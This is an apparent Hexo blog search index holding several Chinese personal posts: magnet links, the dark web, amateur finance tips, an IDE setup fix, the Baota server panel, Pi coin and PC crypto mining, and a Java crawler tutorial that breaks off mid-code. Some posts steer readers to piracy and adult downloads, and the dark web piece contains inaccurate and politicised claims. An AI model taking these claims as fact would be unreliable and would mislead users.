<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>磁力链</title>
      <link href="/2020/04/19/draiy/bt/"/>
      <url>/2020/04/19/draiy/bt/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>老司机们一定会很熟悉这几个名词出现的地点。下载教育片或者上羞羞的网站时都会看到这几个名词，玩某些盗版游戏也会经常见到！</p><pre><code>BT是一种传输协议全称为“BitTorrent”。种子是以“.torrent”结尾的文件。磁力链接是以“magnet:?xt=urn:btih:”开头的字符串链接</code></pre><p>优点  </p><p>磁力链接更加的隐蔽，因为它完全的“去中心化”，就算老师抓到你们抄作业，他也不知道是谁抄的</p><p>总之BT和磁力链可以相互转换，你可以理解为一种可以直接下载资源的地址，这种链，迅雷就可以解析。</p><p>基于P2P<br>Peer to Peer点对点网络，简称 P2P</p><h3 id="如何善用磁力链接"><a href="#如何善用磁力链接" class="headerlink" title="如何善用磁力链接"></a>如何善用磁力链接</h3><p>首先你需要一个可以搜索磁力链的搜索引擎，下面我提供了一个，当然你也可以百度搜索。</p><p><a href="https://www.no404.icu/" target="_blank" rel="noopener">搜索引擎</a></p><p>接着就可以通过迅雷等解析工具下载磁力链当中的资源，是不是很简单？</p><h3 id="强硬的黑科"><a href="#强硬的黑科" class="headerlink" title="强硬的黑科"></a>强硬的黑科</h3><p>当然如果你对那种方面的资源有需求可以使用<a href="http://www.heikeyun.net/" target="_blank" rel="noopener">黑科下载器</a></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暗网</title>
      <link href="/2020/04/18/attark/blackweb/"/>
      <url>/2020/04/18/attark/blackweb/</url>
      
        <content type="html"><![CDATA[<h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><h4 id="最近国家安全日写一下暗网科普"><a href="#最近国家安全日写一下暗网科普" class="headerlink" title="最近国家安全日写一下暗网科普"></a>最近国家安全日写一下暗网科普</h4><p><a href="https://www.bilibili.com/video/BV1FJ411B7cD?from=search&amp;seid=1086305093744127636" target="_blank" rel="noopener">bilibili-message</a><br>暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。</p><h3 id="简述暗网"><a href="#简述暗网" class="headerlink" title="简述暗网"></a>简述暗网</h3><p>暗网顾名思义黑暗的网络，它的英文名字是Shadow Web，人们是没办法通过正常搜索器进入的。暗网里面有着形形色色的人和各种买卖，假如真的想要进入暗网，最好下关闭摄像头更好隐藏自己，仅仅只是看看不做任何事情应该没什么问题。  </p><p>最初，暗网是美国军方的科研项目，但为什么对外开放，这其中一定有它存在的意义，毕竟美国唯恐世界不乱。  </p><p>暗网出售各个国家的个人信息，甚至于清晰到身份证、家长电话等等，只要你曾经在网上留下痕迹暗网中可能就在出售你的信息。</p><p>“暗网”非法交易的主要支付方式是“比特币”，这是一种虚拟电子货币，由具有关联的64位数字网络域名组成。比特币不需要买卖双方的个人信息，在技术层面兼顾了效率与安全，在保证了交易的便捷性的同时，又能够保证交易两方的身份保密性。 </p><p>“暗网”本身是由一群自由派和无政府主义者组建的，其中许多人是反对非自由主义或反对政府主义的人，除此之外美国政府刻意地地推波助澜更使得“暗网”的自由倾向非常明显。</p><p>其所经营的主要业务如毒品交易、军火贩卖，甚至是器官交易、人口交易等。</p><p>暗网已成为大国博弈、政治渗透颠覆的支撑工具<br>暗网中的意识形态是混乱不堪的，其建立者大都是无政府主义和自由主义的拥护者，这就导致大量意识形态混乱的暗网用户趋之若鹜。其中也不乏“民主国家”及极端组织别有用心，利用暗网对其他国家进行攻击甚至是对现有政权进行颠覆。<br>由此可见，暗网不法行为造成的恶劣影响并不仅仅局限于某个国家地区，还对全球的安全环境构成了巨大威胁。 </p><p>只要你给够足够的钱就有人为你服务。</p><h3 id="法律"><a href="#法律" class="headerlink" title="法律"></a>法律</h3><p>危害国家安全罪，十年起步。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑暗网络 </tag>
            
            <tag> 洋葱网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理财与爱好</title>
      <link href="/2020/04/16/draiy/hobby/"/>
      <url>/2020/04/16/draiy/hobby/</url>
      
        <content type="html"><![CDATA[<h3 id="说说爱好"><a href="#说说爱好" class="headerlink" title="说说爱好"></a>说说爱好</h3><p>我的博客从几个月没有一点IP到现在一天有那么几个IP，我很感动。</p><p>今年刚好要20岁，自嘲一下，我是个小垃圾。喜欢的东西可能跟同龄人有很大差异，周围同学，会喜欢打游戏，shopping，运动，健身，小说，追剧，享受生活什么的……于是我的爱好就显得格格不入。。。</p><p>我，受业界人士的影响对金融理财产生了兴趣，每天看到圈子里怎么理财，怎么哈牛皮分析经济市场动向令我羡慕不已，后来这也成了我的爱好之一。</p><p>我喜欢音乐，喜欢咖啡和茶，有时候真觉得我这个年龄不应该喜欢这些，但是我确实逾越了，成了一个老年人。还喜欢电子产品，电脑及配件，哪个搞IT的不希望自己有台很酷的电脑呢？</p><p>梦想吧，有台超跑，白日梦还是要有的，万一实现了呢，年轻人，搏一搏单车变摩托！</p><h3 id="理财"><a href="#理财" class="headerlink" title="理财"></a>理财</h3><p>其实关于理财才是我想介绍的重点。</p><p>当下是移动互联网时代，手机支付随处可见，支付宝微信成了人们日常消费的主要支付工具，那么你的支付宝微信里的钱都是直接放在余额里，还是放在余额宝和零钱通里呢?</p><p>我们都知道放在余额宝和零钱通里都会产生一定收益，这个收益是如何产生的，相信大多数人都没有去真正了解过，我们把钱放入之后，其实是相当于购买了一种货币基金，这种货币基金虽然有一定风险，但是由于是支付工具首打的货币基金，不是经济危机那种情况，一般不会出现亏损。</p><p>将钱放入余额宝或零钱通之后，这个惨淡的收益率只有2.6%左右，收益率一般是七日年化来的，就是近七天的收益率按照365天估算出来的，预估你存放一年会收益多少，简单算一下你有100块，一年可以有102.6RMB。</p><p>但有比余额宝收益率更高的理财产品可以选择。</p><h4 id="稳健理财"><a href="#稳健理财" class="headerlink" title="稳健理财"></a>稳健理财</h4><p>这类理财产品，属于保值型理财，一般由银行，保险公司，证券售出。<br>一般年化利率在3.5%左右，看定期的时间长短浮动2%个点，比如60天3.0% 180天3.9% 360天4.5%。</p><p>我们会看到界面上出现的万元收益xxx元，就是说一万块钱一天能收益多少RMB</p><h4 id="基金理财"><a href="#基金理财" class="headerlink" title="基金理财"></a>基金理财</h4><p>基金的风险分为三六九等，有保值的 也有风险很高很不稳定的，比如货币基金，股票基金等。</p><p>基金的收益多少受股市影响，一般股市涨，基金涨，跌，基金跌，选择基金时就需要做一定研究在选择买入，遵循低价买进高价卖出，不能拿了两天看跌了就卖，大多数基金产品会扣除1.5%的交易费用，持有30天左右降低至0.1%，基金看长期收益，看历史收益，近几年收益率，不要选择20%以上收益，那种振幅较大，不稳定，我觉得8~9%的收益就很高了。</p><p>就目前来说，疫情影响着全世界的经济，某些行业受到影响必然股市下跌，但是相反，医疗资源需求较大，那么它在这种情况下就具有优势。<br><img src="http://img.ahdy.top/mmexport1585262080108.jpg" alt="股市在下跌闭市的情况下医疗基金不跌反涨，在购买基金时要看是什么类型的基金，以及发展趋势"></p><h4 id="关于养鸡的方法"><a href="#关于养鸡的方法" class="headerlink" title="关于养鸡的方法"></a>关于养鸡的方法</h4><p>如果你觉得银行利息太低，又不想承受股票的风险，那么基金无疑是最好的选择。<br>新手建议从债卷基金开始玩起，这类基金最大的特点就是稳，一般要比银行活期高出两个点左右，这类基金基本不会亏损。  </p><p>其次建议选择指数型基金，ETF基金这类基金振幅较小，适合心脏不好的人，指数一般跟着大盘走，但如果你有很好的投资经验，能够分析市场发展前景，那么你投资的基金可能会特立独行！</p><p>在风险上 混合基金&gt;股票基金&gt;指数基金。  </p><p>关于基金一定要选择定投，遵循微笑曲线定律，切莫追涨杀跌，如果你不是一个乐观主义的理财者，会大概率亏损。这东西跟选男人一样要看他是不是有潜力！虽然他现在不怎么样，或许给他几年时间，就会别有一番天地。  </p><h4 id="股票"><a href="#股票" class="headerlink" title="股票"></a>股票</h4><p>此类理财产品，风险极高，不建议学生去炒股，土豪随意，股神随意。</p><p>个人感觉炒币(BTC)的风险比股票小很多。</p><p>股票市场瞬息万变，大多数散户都会被庄家割韭菜。大盘指数决定股市整体情况，非专业人士入市无异于赌博。所以不做过多解释。</p><p>据统计在中国超过70%的人选择稳健理财！ ！ ！</p><p>下面这句话是后来加上的—</p><p>中国的股市赚不了钱，A股赚不了钱，国家调控，扯多了上升政治层面，所以大家知道就好！！！</p><h3 id="理财APP"><a href="#理财APP" class="headerlink" title="理财APP"></a>理财APP</h3><p>如果你支付宝里有钱呢，去下载个蚂蚁财富</p><p>如果你微信有钱呢，去下个腾讯理财通</p><p>这两个App对应支付宝，和微信理财模块</p><h3 id="忠言"><a href="#忠言" class="headerlink" title="忠言"></a>忠言</h3><p>人不理财，财不理人。</p><p>投资有风险，入市需谨慎。</p><p>不能把所有钱都投到非保本型理财产品中(大忌一把梭哈)。</p><p>如果想一把梭哈建议抄底买入。</p><p>不要炒股！</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲散 </tag>
            
            <tag> 爱好 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA-web项目导入</title>
      <link href="/2020/03/14/idea/problem3/"/>
      <url>/2020/03/14/idea/problem3/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们学校让在疫情期间去搞一个个人项目，然而我却报了两个项目，而且项目工程还不小，我搞完了一个之后实在是不想再去弄这些东西了(毕竟人的精力是有限的，我还有很多别的事情对吧!)，于是我想到了再GitHub上去找一个源码项目。so 我碰到了项目导入无法运行的问题。所以简单的记录一下。</p><h3 id="项目导入"><a href="#项目导入" class="headerlink" title="项目导入"></a>项目导入</h3><p>这一步呢!相信大家都会，只要选择File—&gt;Open即可用IDEA去打开一个项目，但是如果你打开的项目是Maven工程，那么也就意味着它需要花费大量时间去访问外网下载jar包。这其中的Jar包可能是某某某框架，也可能是某某工具类。</p><h3 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h3><p>当你的ide下载好了这些依赖之后，这时候你导入的项目其实是无法运行的。要做一定的修改才可以!</p><p>首先要让你的文件夹变色。<br><img src="http://img.ahdy.top/2020-03-16_130829.png" alt="右键文件夹，找到mark directory as即可修改"></p><p>这里要强调的是webapp这个文件夹</p><p>要在File—&gt;Progect Structrue当中设置路径</p><p><img src="http://img.ahdy.top/2020-03-16_131029.png" alt></p><p>然后要保证你的Artfacts当中添加该类型war包</p><p><img src="http://img.ahdy.top/2020-03-16_131203.png" alt="没有就选择上方加号添加进来"></p><p>之后配置tomcat。</p><p><img src="http://img.ahdy.top/2020-03-16_131502.png" alt="必须在Artfacts添加war包不然会报红"></p><p><img src="http://img.ahdy.top/2020-03-16_131805.png" alt="build处如果没有war包药将其添加进来"></p><p>这样tom才能完全加载，并运行你的项目，不然很有可能，tom空转，或者启动页面404!!!</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器</title>
      <link href="/2020/03/02/linux/weblinux/"/>
      <url>/2020/03/02/linux/weblinux/</url>
      
        <content type="html"><![CDATA[<h3 id="宝塔简介"><a href="#宝塔简介" class="headerlink" title="宝塔简介"></a>宝塔简介</h3><p>一个很好用的Linux管理工具。</p><p><a href="https://www.bt.cn/" target="_blank" rel="noopener">宝塔官网</a></p><p>首先需要去执行命令挂载。</p><p><a href="https://www.bilibili.com/video/av83562606?from=search&amp;seid=12788850207292369452" target="_blank" rel="noopener">b站教程</a></p><p><a href="https://blog.csdn.net/qq_42549792/article/details/96630332" target="_blank" rel="noopener">csdn部署Java web</a></p><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="http://img.ahdy.top/2020-03-07_155019.png" alt></p><p>以前我再Windows上时更新静态页面都是手动去打包覆盖，现在这工具不仅能在线编辑代码生效，最重要的是它还有代码提示功能。可以说功能非常强了。</p><h3 id="关于创建站点提示请先安装Web服务器问题的解决"><a href="#关于创建站点提示请先安装Web服务器问题的解决" class="headerlink" title="关于创建站点提示请先安装Web服务器问题的解决"></a>关于创建站点提示请先安装Web服务器问题的解决</h3><p>使用终端运行</p><pre><code>yum install lua-devel</code></pre><p>将原有的web容器卸载重装一般即可解决</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>服务器上缺少lua模块，没有真正下载配置成功</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 宝塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机挖矿</title>
      <link href="/2020/03/01/draiy/pi/"/>
      <url>/2020/03/01/draiy/pi/</url>
      
        <content type="html"><![CDATA[<h3 id="关于Pi币的解释"><a href="#关于Pi币的解释" class="headerlink" title="关于Pi币的解释"></a>关于Pi币的解释</h3><p><a href="https://www.bilibili.com/video/av93060633?from=search&amp;seid=4991965819975324555" target="_blank" rel="noopener">b站</a></p><p><a href="https://www.zhihu.com/question/354032748?page=1&amp;sort=created" target="_blank" rel="noopener">知乎</a></p><h3 id="pi币官网"><a href="#pi币官网" class="headerlink" title="pi币官网"></a>pi币官网</h3><p><a href="https://piex.info/index.html" target="_blank" rel="noopener">官方地址</a></p><h3 id="pi币挖矿-注册教程"><a href="#pi币挖矿-注册教程" class="headerlink" title="pi币挖矿/注册教程"></a>pi币挖矿/注册教程</h3><p><a href="https://jingyan.baidu.com/article/ce436649c72b7a7673afd3a9.html" target="_blank" rel="noopener">地址</a></p><p><a href="http://119.29.6.96/pi" target="_blank" rel="noopener">地址2</a></p><p><a href="https://blog.csdn.net/weixin_41855029/article/details/104224677" target="_blank" rel="noopener">地址3</a></p><h3 id="博主的邀请码"><a href="#博主的邀请码" class="headerlink" title="博主的邀请码"></a>博主的邀请码</h3><pre><code>zzl667936建议熟人使用，当然你能看到我的博客就算我们是熟人了！</code></pre><p>反正是免费的，抱着玩的心态就好，屯点币说不定以后有价值了呢！</p>]]></content>
      
      
      <categories>
          
          <category> Pi币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖矿 </tag>
            
            <tag> Pi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑挖矿</title>
      <link href="/2020/02/29/draiy/btc/"/>
      <url>/2020/02/29/draiy/btc/</url>
      
        <content type="html"><![CDATA[<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>本以为，我不会这么早接触到比特币这个东西，但实际我不但接触到了它，而且挖掘了它。  </p><p>我和我的服务器愉快的生活着，突然有一天，我想远程连接连接数据库，于是，我试了很久没有成功，最后发现是服务器安全组没有放行端口，我不知怎么操作的，一键开放了很多端口，造成了我的服务器被矿。<br>我突然收到了阿里云的短信<br><img src="http://img.ahdy.top/mmexport1583383440322.jpg" alt><br>嗯，然后我上去一看，cpu内存爆满。 发现后台有一个Xm？？什么挖矿程序，干掉它之后，我对挖矿产生了兴趣。</p><h3 id="关于挖矿"><a href="#关于挖矿" class="headerlink" title="关于挖矿"></a>关于挖矿</h3><p>日本一个叫中本聪的人制定的游戏规则(比特币系统)，系统内有数学题，看谁家挖矿设备先有解，看过刀剑神域的人可能更容易理解些，如果你足够幸运，挖到一个区块，并获得12.5个比特币奖励，顺带那个区块里所有交易的手续费。这是广大矿工废寝忘食的源动力。</p><p>简单来说，挖矿就是用电脑上的CPU和GPU资源进行hash计算， 并通过计算获取到区块奖励，区块奖励就是相应的电子虚拟货币。拥有更大算力计算机／挖矿机的矿工，获得的收益越大。</p><p>算力跟计算机硬件配置有很大关系。</p><p>了解了一些资料之后，发现挖矿走过了三个历程，即CPU挖矿，GPU挖矿，一直到今天的专业矿机挖矿和矿池挖矿。</p><h3 id="挖矿需要什么？"><a href="#挖矿需要什么？" class="headerlink" title="挖矿需要什么？"></a>挖矿需要什么？</h3><p>一台电脑，一个收钱的钱包，一个挖矿软件。<br>从软硬件来看就只要这几样东西，但是这其中没有考虑电能消耗，电脑硬件寿命消耗。</p><p>因为进行挖矿电脑会处于一个超频工作的状态，各项功耗达到峰值。</p><h3 id="挖矿有什么价值？"><a href="#挖矿有什么价值？" class="headerlink" title="挖矿有什么价值？"></a>挖矿有什么价值？</h3><p>谈到比特币，往往人们往往都会想起区块链，比特币是区块链第一个应用</p><p>就我研究了一天的结果来看不能说清它的价值在哪，btc本身就是个虚无缥缈的东西。</p><p>说它浪费电?污染环境？还是说它促进网络交易，推动了社会发展？这就是人们常说的那句话，事务的发展往往具有多面性。</p><h3 id="如何挖矿？"><a href="#如何挖矿？" class="headerlink" title="如何挖矿？"></a>如何挖矿？</h3><h4 id="傻瓜式挖矿软件"><a href="#傻瓜式挖矿软件" class="headerlink" title="傻瓜式挖矿软件"></a>傻瓜式挖矿软件</h4><p><a href="http://hashfish.net/pg.html?sc=122171" target="_blank" rel="noopener">哈鱼矿工</a></p><p>省了设置什么钱包地址，配置挖矿软件，翻墙注册账号，产看收益，提现等各种难题，如果你只是想挖着玩玩，建议用这个。</p><h4 id="NiceHash"><a href="#NiceHash" class="headerlink" title="NiceHash"></a>NiceHash</h4><p><a href="https://www.nicehash.com" target="_blank" rel="noopener">nicehashi官网</a></p><p>这官网我也不知道为啥不能注册账号，但是却可以进去浏览很多东西，据说是没有梯子,现在梯子教程都被屏蔽掉了….</p><h4 id="ViaBic"><a href="#ViaBic" class="headerlink" title="ViaBic"></a>ViaBic</h4><p><a href="https://www.viabtc.com/" target="_blank" rel="noopener">官网</a></p><p>这是个国产的，但是操作比较麻烦，而且抽成高，提现要手续费，不建议用。</p><h4 id="长沙矿工"><a href="#长沙矿工" class="headerlink" title="长沙矿工"></a>长沙矿工</h4><p><a href="http://www.csminer.com/" target="_blank" rel="noopener">官网</a></p><p>自行查看相关文档学习挖矿！</p><h3 id="挖矿经验"><a href="#挖矿经验" class="headerlink" title="挖矿经验"></a>挖矿经验</h3><p>经过我一番折腾，最后选择了哈鱼，毕竟操作简单,软件当中你可以选择双挖，或者单独使用CUP，GPU挖矿，其中显卡占收益的80%左右，在设置中可以修改算法。</p><p><img src="http://img.ahdy.top/mmexport1583383443969.jpg" alt="我的服务器的收益"></p><p>没错，一天八分收益感人！</p><p>用自己的笔记本电脑估算一天三块钱左右，其实连电费都不够。</p><pre><code>电脑配置仅供参考:GTX1060  2元i7 8750H  0.5元</code></pre><h3 id="哈鱼矿工使用"><a href="#哈鱼矿工使用" class="headerlink" title="哈鱼矿工使用"></a>哈鱼矿工使用</h3><p><img src="http://img.ahdy.top/2020-03-06_085428.png" alt="此时挂机就可以进行挖矿了"></p><p>看了下软件其实只占用了60%的显卡资源,由于CUP挖矿收益比较低，所以我只用了显卡…</p><p><img src="http://img.ahdy.top/2020-03-06_085753.png" alt>    </p><h4 id="收益"><a href="#收益" class="headerlink" title="收益"></a>收益</h4><p>去官网下载一个app就能提现，需要满0.0001比特币才能提现(大概人民币五六块样子)，提现到支付宝需要2%抽成，体现到比特币钱包有1%抽成。这个抽成相比较很多5%的挖矿软件其实是算低的…</p><p><a href="http://hashfish.net/app.html" target="_blank" rel="noopener">哈鱼官方app</a></p><p><img src="http://img.ahdy.top/2020-03-06_090444.png" alt></p><h4 id="如何提现到BTC钱包"><a href="#如何提现到BTC钱包" class="headerlink" title="如何提现到BTC钱包"></a>如何提现到BTC钱包</h4><p>国内比较好用的钱包。这个钱包不仅能收取其它矿池挖取的比特币，还能在线买卖比特币,其他币种(虚拟货币交易价格取决于当时市场价)</p><p><a href="https://bitpie.com/#/" target="_blank" rel="noopener">比特派app下载</a></p><p><img src="http://img.ahdy.top/2020-03-06_091122.png" alt="下载注册好后选择收款"></p><p><img src="http://img.ahdy.top/2020-03-06_091445.png" alt="此时它会给你一个钱包地址，将二维码下的钱包地址粘贴到哈鱼app钱包提现处就能将电脑挖取的比特币转入比特币钱包"></p>]]></content>
      
      
      <categories>
          
          <category> 比特币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BTC </tag>
            
            <tag> 挖矿 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java网络编程-爬虫</title>
      <link href="/2020/02/28/java/spider/"/>
      <url>/2020/02/28/java/spider/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>其实我深知Java的爬虫比python要复杂很多，原因python先天的优势加上其丰富的第三方库，而就目前我的水平来看，只能用Java</p><pre><code>思路:用HttpClient模拟请求html 获取html源码；用jsoup方法抓取解析网页数据用HttpClient模拟请求html 获取html源码；用正则抓取解析网页数据补充:jsoup是一款Java的HTML解析器,可直接解析某个URL地址、HTML文本内容。</code></pre><p>因为学校让在家搞个项目，我实在是想不出来有什么比较新颖的东西，就觉得爬虫这东西比较神奇，于是就报了一个项目，不管有什么结果，我还是想把它做完善，其实是我写项目介绍的时候写过了，说我的爬虫能爬音频，视频，文本，图片，HTML响应，尽管项目很小但bug层出不穷，所以我决定边做，边写….</p><h4 id="数据的作用"><a href="#数据的作用" class="headerlink" title="数据的作用"></a>数据的作用</h4><p>网上很多人说爬虫违法，其实我们只要以学习为目的，不损害他人利益就不会触碰到法律,毕竟技术无罪，人有罪。  </p><p>其实不然，爬虫的作用很多，百度就是一个爬虫，当你做了一个个人网站，或者博客，当你的站点有一定的流量的时候，你会发现你的网站在百度一下当中可以被搜索到，这就是因为，百度爬取了你的站点信息，并且把信息收录到了它的搜索引擎库内。</p><p>身处大数据的影响下，数据就是金钱。</p><p>金融，做市场分析，电商，做产品调研，很多东西的排名都离不开数据分析，而获取数据的工具就是爬虫。</p><h3 id="项目截图"><a href="#项目截图" class="headerlink" title="项目截图"></a>项目截图</h3><p><img src="http://img.ahdy.top/2020-03-03_082937.png" alt></p><p><img src="http://img.ahdy.top/2020-03-03_083028.png" alt><br>界面使用的是FX，目前对于FX依然很懵…项目后面会打包发布，双击.exe文件就能启动，与源码一并放入网盘，附在文档结尾处,我会将项目当中功能逐一分解，以便单独需要时使用</p><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>URL是统一资源定位符的简称，它表示Internet上某资源的地址。通过URL我们可以访问网络上的各种资源。</p><p>URL对象是一个绝对的URL地址，但URL对象可用绝对URL、相对URL和部分URL来构建。</p><h4 id="使用Java程序上网"><a href="#使用Java程序上网" class="headerlink" title="使用Java程序上网"></a>使用Java程序上网</h4><pre><code>import java.io.BufferedReader;import java.io.InputStreamReader;import java.net.URL;import java.net.URLConnection;public class t {public static void main(String[] args) throws Exception{    URL url = new URL(&quot;http://www.baidu.com/&quot;);    //拿到UrL地址    URLConnection connection = url.openConnection();    //打开连接    connection.connect();    //访问资源，下面就是IO流取回信息    BufferedReader br = new BufferedReader(new InputStreamReader(            url.openStream(),&quot;UTF-8&quot;));    String line = null;    while (null != (line = br.readLine())) {        System.out.println(line);    }    br.close();}}</code></pre><p>使用URL可以远程访问资源，URL有openConnection()方法，用此来创建一个URLConnection对象，与调用URL对象相关，它返回一个URLConnection对象。但是它可能会发生I/O异常。</p><p><img src="http://img.ahdy.top/2020-03-03_081916.png" alt></p><h3 id="获取网页上的文字信息"><a href="#获取网页上的文字信息" class="headerlink" title="获取网页上的文字信息"></a>获取网页上的文字信息</h3><pre><code>import java.io.BufferedReader;import java.io.InputStreamReader;import java.net.HttpURLConnection;import java.net.URL;import java.util.List;import java.util.Scanner;import org.jsoup.Jsoup;import org.jsoup.nodes.Document;import org.jsoup.nodes.Node;import org.jsoup.nodes.TextNode;/** * 抓取网页数据工具类 * @author asus-pc * */public class GrabUrl {public static String getUrlText(String url) throws Exception{    URL getUrl=new URL(url);    HttpURLConnection connection=(HttpURLConnection)getUrl.openConnection();    connection.connect();    BufferedReader reader=new BufferedReader(new InputStreamReader(connection.getInputStream(),&quot;utf-8&quot;));    StringBuffer buffer=new StringBuffer();    String lines=null;    while ((lines=reader.readLine())!=null){        lines=new String(lines.getBytes(),&quot;utf-8&quot;);        buffer=buffer.append(lines+&quot;\n&quot;);    }    reader.close();    connection.disconnect();    return buffer.toString();}private static String extractText(Node node){    if(node instanceof TextNode){            return ((TextNode) node).text();      }     List&lt;Node&gt; children = node.childNodes();       StringBuffer buffer = new StringBuffer();        for (Node child: children) {           buffer.append(extractText(child));     }       return buffer.toString();}public static String html2Str(String html){       Document doc = Jsoup.parse(html);        return extractText(doc);}/**测试*/public static void main(String[] args) {    try {        System.out.println(&quot;请输入网址：&quot;);        Scanner scanner=new Scanner(System.in);        String urlString=scanner.next();        String aString=getUrlText(urlString);        String aSt=html2Str(aString);        System.out.println(aSt);    } catch (Exception e) {        // TODO Auto-generated catch block        e.printStackTrace();    }}}</code></pre><p>——————————————————————————————————</p><pre><code>jar包依赖:&lt;dependency&gt;  &lt;groupId&gt;org.jsoup&lt;/groupId&gt;  &lt;artifactId&gt;jsoup&lt;/artifactId&gt;  &lt;version&gt;1.8.3&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="获取网站响应信息"><a href="#获取网站响应信息" class="headerlink" title="获取网站响应信息"></a>获取网站响应信息</h3><pre><code>   import java.io.IOException;import java.net.MalformedURLException;import java.net.URL;import java.net.URLConnection;import java.util.Map;import java.util.Set;public class GetHttpHead {    public static String HeadMessage(String Url)  {        URL url = null;         //创建一个URL对象，赋值为空；        String result;        result = &quot;非正常的响应信息！&quot;;           //返回结果集        try {            url = new URL(Url);         //实例化url        } catch (MalformedURLException e) {            e.printStackTrace();            System.out.println(&quot;非正常访问的URL&quot;);        }        URLConnection conn = null;        try {            conn = url.openConnection();        } catch (IOException e) {            e.printStackTrace();            System.out.println(&quot;系统抛出了异常信息&quot;);        }        Map headers = conn.getHeaderFields();        Set&lt;String&gt; keys = headers.keySet();        for( String key : keys ){            String val = conn.getHeaderField(key);            result+=key+&quot;    &quot;+val+&quot;\n&quot;;           if (val.equals(&quot;HTTP/1.1 200 OK&quot;)){               result=&quot;站点可以正常访问\n响应信息：&quot;;}           }        System.out.println( conn.getLastModified() );        return result;    }//    public static void main(String[] args) throws IOException {////        System.out.println( HeadMessage(&quot;http://z.ahdy.top&quot;));//    }}</code></pre><h3 id="获取网站图片"><a href="#获取网站图片" class="headerlink" title="获取网站图片"></a>获取网站图片</h3><p><a href="https://blog.csdn.net/dashan_1200/article/details/101286268?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">致谢!</a></p><pre><code>package GetImg;import java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.BufferedReader;import java.io.BufferedWriter;import java.io.File;import java.io.FileOutputStream;import java.io.FileReader;import java.io.FileWriter;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.HttpURLConnection;import java.net.URL;import java.util.ArrayList;import java.util.List;import java.util.regex.Matcher;import java.util.regex.Pattern;import org.jsoup.Jsoup;import org.jsoup.helper.StringUtil;import org.jsoup.nodes.Document;import org.jsoup.select.Elements;/** * * @ClassName: ImgTool * @Description:IMG tool ，请先赋值URL 获取指定ULR的某个网页里面 *                  1.返回所有图像url list *                  2.图像文件夹路径.txt *                  3.所有图像保存在img文件夹里面 * @author penny * @date 2020年3月7日 下午13:07:49 * */public class ImgTool {    // 参数域    /** 指定URL */    public static String URL = &quot;http://z.ahdy.top/&quot;;    private int imgNumbs = 0;    public static List&lt;String&gt; downloadMsg=new ArrayList&lt;String&gt;();    public String imgUrlTxt = &quot;imgURLs.txt&quot;;    public static String regex= &quot;^((https|http|ftp|rtsp|mms)?://)&quot;            + &quot;?(([0-9a-z_!~*&#39;().&amp;=+$%-]+: )?[0-9a-z_!~*&#39;().&amp;=+$%-]+@)?&quot; //ftp的user@            + &quot;(([0-9].)[0-9]&quot; // IP形式的URL- 199.194.52.184            + &quot;|&quot; // 允许IP和DOMAIN（域名）            + &quot;([0-9a-z_!~*&#39;()-]+.)*&quot; // 域名-            + &quot;([0-9a-z][0-9a-z-])?[0-9a-z].&quot; // 二级域名            + &quot;[a-z])&quot; // first level domain- .com or .museum            + &quot;(:[0-9])?&quot; // 端口- :80            + &quot;((/?)|&quot; // a slash isn&#39;t required if there is no file name            + &quot;(/[0-9a-z_!~*&#39;().;?:@&amp;=+$,%#-]+)+/?)$&quot;;    private ImgTool() {    };    private static ImgTool instance = new ImgTool();    /** 获取ImgTool 单例 */    public static ImgTool getInstance() {        return instance;    }    public List&lt;String&gt; getURLs() {        return getURLs(null);    }    public boolean isURL(String str) {        if(StringUtil.isBlank(str)){            return false;        }else{//      String regex = &quot;^(?:https?://)?[\\w]{1,}(?:\\.?[\\w]{1,})+[\\w-_/?&amp;=#%:]*$&quot;;//      String regex = &quot;^([hH][tT]{2}[pP]:/*|[hH][tT]{2}[pP][sS]:/*|[fF][tT][pP]:/*)(([A-Za-z0-9-~]+).)+([A-Za-z0-9-~\\/])+(\\?{0,1}(([A-Za-z0-9-~]+\\={0,1})([A-Za-z0-9-~]*)\\&amp;{0,1})*)$&quot;;            Pattern pattern = Pattern.compile(regex);            Matcher matcher = pattern.matcher(str);            if(matcher.matches()){                return true;            }else{                return false;            }        }};    /***     * @Title: getURLs     * @Description: 